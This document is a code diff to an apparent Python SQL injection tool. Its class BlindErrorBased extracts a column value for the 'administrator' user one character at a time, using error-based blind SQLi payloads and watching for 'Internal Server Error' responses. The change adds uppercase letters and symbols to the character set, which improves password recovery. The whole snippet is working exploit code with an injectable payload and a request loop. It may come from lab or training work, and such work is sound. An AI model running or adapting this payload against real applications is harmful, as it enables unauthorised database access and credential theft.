@@ -10,7 +10,7 @@ class BlindErrorBased(BaseSQLi):
 
     def extract(self, column, username='administrator'):
         for position in range(1, 30):
-            for char in string.ascii_lowercase + string.digits:
+            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*":
                 payload = f"'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN {DB_CONFIG[self.db_type]['error_trigger']} ELSE '' END{DB_CONFIG[self.db_type]['from_dual']})||'"
                 response = self.send(payload)
                 if "Internal Server Error" in response.text:
